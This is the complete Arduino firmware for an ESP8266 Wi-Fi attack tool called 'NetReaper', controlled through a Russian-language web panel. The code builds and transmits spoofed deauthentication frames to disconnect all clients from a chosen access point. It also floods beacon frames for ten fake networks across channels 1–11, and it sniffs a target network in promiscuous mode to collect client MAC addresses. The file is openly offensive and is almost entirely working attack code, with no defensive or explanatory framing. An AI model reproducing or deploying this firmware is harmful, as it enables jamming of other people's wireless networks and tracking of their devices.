#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

const String VERSION = "1.2";

char ap_ssid[32] = "NetReaper";
char ap_password[64] = "password123";
uint8_t local_ip[4] = {192, 168, 4, 1};

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

bool attack_active = false;
bool beacon_active = false;
bool client_scan_active = false;

uint8_t target_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int target_channel = 1;
unsigned long scan_start_time = 0;

String scan_results_html = "";
String client_results_html = "";

struct WhitelistEntry {
  uint8_t mac[6];
  bool active;
};
WhitelistEntry whitelist[5];

struct ClientEntry {
  uint8_t mac[6];
  bool active;
};
ClientEntry found_clients[20];
int client_count = 0;

uint8_t deauth_packet[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

uint8_t beacon_packet[128] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x0F, 0x00, 0x0F, 0x00, 0x0F,
  0x00, 0x0F, 0x00, 0x0F, 0x00, 0x0F,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x01, 0x04
};

const char* fake_ssids[10] = {
  "🔑 Free_Wi-Fi_Unsecured",
  "🕶️ NSA_Surveillance_Van",
  "☠️ NetReaper_Zone",
  "🤖 CyberNet_Node_5",
  "🌐 Public_Hotspot_Free",
  "🛸 UFO_Communication",
  "🔒 Secured_Network_5G",
  "📺 Smart_TV_LivingRoom",
  "☕ Coffee_Shop_Guest",
  "🎮 Gaming_Router_99"
};

void sniffer_callback(uint8_t *buf, uint16_t len) {
  if (!client_scan_active || len < 32) return;
  
  uint8_t *bssid = buf + 16;
  bool match = true;
  for (int i = 0; i < 6; i++) {
    if (bssid[i] != target_mac[i]) { match = false; break; }
  }
  
  if (!match) {
    bssid = buf + 10;
    match = true;
    for (int i = 0; i < 6; i++) {
      if (bssid[i] != target_mac[i]) { match = false; break; }
    }
  }
  
  if (!match) return;

  bool is_target_src = true;
  for (int i = 0; i < 6; i++) {
    if (buf[4 + i] != target_mac[i]) { is_target_src = false; break; }
  }

  uint8_t *client_mac = is_target_src ? (buf + 10) : (buf + 4);
  if (client_mac[0] == 0xFF || client_mac[0] == 0x33 || client_mac[0] == 0x01) return;

  for (int i = 0; i < client_count; i++) {
    bool dup = true;
    for (int j = 0; j < 6; j++) {
      if (found_clients[i].mac[j] != client_mac[j]) { dup = false; break; }
    }
    if (dup) return;
  }

  if (client_count < 20) {
    for (int j = 0; j < 6; j++) found_clients[client_count].mac[j] = client_mac[j];
    found_clients[client_count].active = true;
    client_count++;
  }
}

void loadSettings() {
  EEPROM.begin(512);
  if (EEPROM.read(0) == 99) {
    EEPROM.get(5, ap_ssid);
    EEPROM.get(40, ap_password);
    EEPROM.get(110, whitelist);
    EEPROM.get(200, local_ip);
  } else {
    EEPROM.write(0, 99);
    EEPROM.put(5, ap_ssid);
    EEPROM.put(40, ap_password);
    for(int i=0; i<5; i++) whitelist[i].active = false;
    EEPROM.put(110, whitelist);
    EEPROM.put(200, local_ip);
    EEPROM.commit();
  }
}

void saveSettings() {
  EEPROM.put(5, ap_ssid);
  EEPROM.put(40, ap_password);
  EEPROM.put(110, whitelist);
  EEPROM.put(200, local_ip);
  EEPROM.commit();
}

String getHeader() {
  IPAddress currentIP(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>NetReaper v" + VERSION + "</title>";
  html += "<style>body{font-family:Arial,sans-serif;background:#121212;color:#e0e0e0;text-align:center;padding:20px;margin:0;}";
  html += ".nav{background:#1e1e1e;padding:10px;margin-bottom:20px;border-radius:4px;} .nav a{color:#2196F3;text-decoration:none;margin:0 15px;font-weight:bold;}";
  html += ".btn{background:#2196F3;color:white;border:none;padding:12px 24px;font-size:16px;margin:10px;cursor:pointer;border-radius:4px;}";
  html += ".btn-stop{background:#f44336;} .btn-scan{background:#4CAF50;} .btn-save{background:#FF9800;} .btn-action{background:#9C27B0;}";
  html += ".box{background:#1e1e1e;padding:20px;border-radius:8px;max-width:500px;margin:0 auto 20px auto;box-shadow:0 4px 6px rgba(0,0,0,0.3);text-align:left;}";
  html += "h1, h3{text-align:center;} table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:14px;}";
  html += "input[type='text'], input[type='password']{width:90%;padding:10px;margin-top:5px;background:#2d2d2d;border:1px solid #444;color:#fff;border-radius:4px;}";
  html += ".footer{font-size:12px;color:#555;margin-top:20px;}</style></head><body>";
  html += "<h1>💀 NetReaper <span style='font-size:14px;color:#2196F3;'>v" + VERSION + "</span></h1>";
  html += "<div class='nav'><a href='http://" + currentIP.toString() + "/'>Главная</a><a href='http://" + currentIP.toString() + "/settings'>Настройки</a></div>";
  return html;
}

void handleRoot() {
  String html = getHeader();
  
  html += "<div class='box'>";
  html += "<h3>Модули Системы</h3>";
  
  if (attack_active) {
    html += "<p style='color:#f44336;font-weight:bold;text-align:center;'>АКТИВНО: ГЛУШЕНИЕ СЕТИ</p>";
    html += "<div style='text-align:center;'><a href='/stop'><button class='btn btn-stop'>ОСТАНОВИТЬ</button></a></div>";
  } else if (beacon_active) {
    html += "<p style='color:#9C27B0;font-weight:bold;text-align:center;'>АКТИВНО: BEACON SPAM (10 сетей)</p>";
    html += "<div style='text-align:center;'><a href='/stop'><button class='btn btn-stop'>ОСТАНОВИТЬ</button></a></div>";
  } else if (client_scan_active) {
    html += "<p style='color:#FF9800;font-weight:bold;text-align:center;'>АКТИВНО: СКАНИРОВАНИЕ КЛИЕНТОВ...</p>";
    html += "<div style='text-align:center;'><a href='/stop-client-scan'><button class='btn btn-stop'>ЗАВЕРШИТЬ</button></a></div>";
  } else {
    html += "<p style='color:#4CAF50;font-weight:bold;text-align:center;'>Система готова</p>";
    html += "<div style='text-align:center;'>";
    html += "<a href='/scan'><button class='btn btn-scan'>Сканировать Роутеры</button></a>";
    html += "<a href='/beacon-start'><button class='btn btn-action'>Запустить Beacon Spam</button></a>";
    html += "</div>";
  }
  html += "</div>";

  if (client_scan_active || client_count > 0) {
    html += "<div class='box'>";
    html += "<h3>Подключенные клиенты целевой сети</h3>";
    if (client_count == 0) {
      html += "<p style='color:#888;text-align:center;'>Слушаем эфир. Ожидайте появление устройств...</p>";
    } else {
      html += "<table><tr><th>MAC адрес клиента</th><th>Статус</th></tr>";
      for (int i = 0; i < client_count; i++) {
        String mStr = "";
        for (int j = 0; j < 6; j++) {
          char buf[4];
          sprintf(buf, "%02X", found_clients[i].mac[j]);
          mStr += String(buf) + (j < 5 ? ":" : "");
        }
        html += "<tr><td>" + mStr + "</td><td style='color:#f44336;'>Перехвачен</td></tr>";
      }
      html += "</table>";
    }
    html += "</div>";
  }

  html += "<div class='box'>";
  html += "<h3>Точки доступа Wi-Fi</h3>";
  if (scan_results_html == "") {
    html += "<p style='color:#888;text-align:center;'>Запустите сканирование роутеров.</p>";
  } else {
    html += "<table><tr><th>SSID</th><th>Ch</th><th>Signal</th><th>Действия</th></tr>" + scan_results_html + "</table>";
  }
  html += "</div>";

  html += "<div class='footer'>NetReaper Project &copy; 2026</div></body></html>";
  server.send(200, "text/html", html);
}

void handleSettings() {
  String html = getHeader();
  IPAddress currentIP(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  
  html += "<div class='box'>";
  html += "<h3>Параметры Сети и IP</h3>";
  html += "<form action='/save-config' method='POST'>";
  html += "Имя сети NetReaper (SSID):<br><input type='text' name='ssid' value='" + String(ap_ssid) + "'><br><br>";
  html += "Пароль сети:<br><input type='password' name='pass' value='" + String(ap_password) + "'><br><br>";
  html += "IP-адрес панели управления:<br><input type='text' name='ip_addr' value='" + currentIP.toString() + "'><br><br>";
  html += "<input type='submit' class='btn btn-save' value='Сохранить и перезагрузить'>";
  html += "</form>";
  html += "</div>";

  html += "<div class='box'>";
  html += "<h3>WhiteList (Исключения)</h3>";
  html += "<form action='/save-whitelist' method='POST'>";
  for (int i = 0; i < 5; i++) {
    String macStr = "";
    if (whitelist[i].active) {
      for (int j = 0; j < 6; j++) {
        char buf[4];
        sprintf(buf, "%02X", whitelist[i].mac[j]);
        macStr += String(buf) + (j < 5 ? ":" : "");
      }
    }
    html += "Устройство " + String(i + 1) + " (MAC):<br>";
    html += "<input type='text' name='wl_mac_" + String(i) + "' placeholder='AA:BB:CC:DD:EE:FF' value='" + macStr + "'><br><br>";
  }
  html += "<input type='submit' class='btn' value='Обновить Белый Список'>";
  html += "</form>";
  html += "</div>";

  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleSaveConfig() {
  if (server.hasArg("ssid") && server.hasArg("pass") && server.hasArg("ip_addr")) {
    String s = server.arg("ssid");
    String p = server.arg("pass");
    String ipStr = server.arg("ip_addr");
    
    s.toCharArray(ap_ssid, 32);
    p.toCharArray(ap_password, 64);
    
    unsigned int ip_b[4];
    if (sscanf(ipStr.c_str(), "%u.%u.%u.%u", &ip_b[0], &ip_b[1], &ip_b[2], &ip_b[3]) == 4) {
      for(int i=0; i<4; i++) local_ip[i] = (uint8_t)ip_b[i];
    }
    saveSettings();
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
  delay(1000);
  ESP.restart();
}

void handleSaveWhitelist() {
  for (int i = 0; i < 5; i++) {
    String argName = "wl_mac_" + String(i);
    if (server.hasArg(argName)) {
      String macStr = server.arg(argName);
      macStr.trim();
      if (macStr.length() == 17) {
        unsigned int mac_bytes[6];
        if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
          for (int j = 0; j < 6; j++) whitelist[i].mac[j] = (uint8_t)mac_bytes[j];
          whitelist[i].active = true;
        }
      } else {
        whitelist[i].active = false;
      }
    }
  }
  saveSettings();
  server.sendHeader("Location", "/settings");
  server.send(302, "text/plain", "");
}

void handleScan() {
  attack_active = false;
  beacon_active = false;
  client_scan_active = false;
  wifi_promiscuous_enable(0);
  scan_results_html = "";
  
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    if (ssid == "") ssid = "*Hidden Network*";
    int ch = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    String bssid_str = WiFi.BSSIDstr(i);

    scan_results_html += "<tr><td>" + ssid + "</td><td>" + String(ch) + "</td><td>" + String(rssi) + " dBm</td>";
    scan_results_html += "<td><a href='/attack?bssid=" + bssid_str + "&ch=" + String(ch) + "'><button class='btn' style='padding:5px 5px;font-size:11px;margin:0;'>Deauth</button></a> ";
    scan_results_html += "<a href='/scan-clients?bssid=" + bssid_str + "&ch=" + String(ch) + "'><button class='btn btn-action' style='padding:5px 5px;font-size:11px;margin:0;'>Clients</button></a></td></tr>";
  }
  
  IPAddress ip(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleScanClients() {
  if (server.hasArg("bssid") && server.hasArg("ch")) {
    String bssid_str = server.arg("bssid");
    target_channel = server.arg("ch").toInt();
    
    unsigned int mac_bytes[6];
    if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
      for (int i = 0; i < 6; i++) target_mac[i] = (uint8_t)mac_bytes[i];
      
      attack_active = false;
      beacon_active = false;
      client_count = 0;
      client_results_html = "";
      client_scan_active = true;
      scan_start_time = millis();
      
      WiFi.disconnect();
      wifi_promiscuous_enable(1);
      wifi_set_promiscuous_rx_cb(sniffer_callback);
      wifi_set_channel(target_channel);
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStopClientScan() {
  client_scan_active = false;
  wifi_promiscuous_enable(0);
  
  IPAddress ip(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleAttack() {
  if (server.hasArg("bssid") && server.hasArg("ch")) {
    String bssid_str = server.arg("bssid");
    target_channel = server.arg("ch").toInt();

    unsigned int mac_bytes[6];
    if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
      for (int i = 0; i < 6; i++) {
        target_mac[i] = (uint8_t)mac_bytes[i];
        deauth_packet[10 + i] = target_mac[i];
        deauth_packet[16 + i] = target_mac[i];
      }
      beacon_active = false;
      client_scan_active = false;
      attack_active = true;
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleBeaconStart() {
  attack_active = false;
  client_scan_active = false;
  beacon_active = true;
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStop() {
  attack_active = false;
  beacon_active = false;
  client_scan_active = false;
  wifi_promiscuous_enable(0);
  
  IPAddress ip(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void send_beacon_frame(const char* ssid, int channel) {
  int ssid_len = strlen(ssid);
  for (int i = 0; i < 6; i++) {
    beacon_packet[10 + i] = random(256);
    beacon_packet[16 + i] = beacon_packet[10 + i];
  }
  beacon_packet[37] = channel;
  beacon_packet[38] = 0x00;
  beacon_packet[39] = (uint8_t)ssid_len;
  memcpy(beacon_packet + 40, ssid, ssid_len);
  
  beacon_packet[40 + ssid_len] = 0x01;
  beacon_packet[41 + ssid_len] = 0x08;
  uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(beacon_packet + 42 + ssid_len, rates, 8);
  
  wifi_send_pkt_freedom(beacon_packet, 50 + ssid_len, 0);
}

void setup() {
  Serial.begin(115200);
  loadSettings();

  WiFi.mode(WIFI_AP_STA);
  IPAddress ip(local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);

  dnsServer.start(DNS_PORT, "*", ip);

  server.on("/", handleRoot);
  server.on("/settings", handleSettings);
  server.on("/save-config", handleSaveConfig);
  server.on("/save-whitelist", handleSaveWhitelist);
  server.on("/scan", handleScan);
  server.on("/scan-clients", handleScanClients);
  server.on("/stop-client-scan", handleStopClientScan);
  server.on("/attack", handleAttack);
  server.on("/beacon-start", handleBeaconStart);
  server.on("/stop", handleStop);
  
  server.on("/generate_204", handleRoot);
  server.on("/fwlink", handleRoot);
  server.onNotFound(handleRoot);

  server.begin();
}

void loop() {
  if (!client_scan_active) {
    dnsServer.processNextRequest();
    server.handleClient();
  } else {
    if (millis() - scan_start_time > 15000) {
      handleStopClientScan();
      return;
    }
  }

  if (attack_active) {
    wifi_promiscuous_enable(1);
    wifi_set_channel(target_channel);
    for (int i = 0; i < 4; i++) {
       wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), 0);
       delay(1);
    }
    wifi_promiscuous_enable(0);
    delay(15); 
  }

  if (beacon_active) {
    wifi_promiscuous_enable(1);
    for (int c = 1; c <= 11; c++) {
      wifi_set_channel(c);
      for (int i = 0; i < 10; i++) {
        send_beacon_frame(fake_ssids[i], c);
        delay(1);
      }
    }
    wifi_promiscuous_enable(0);
    delay(10);
  }
}
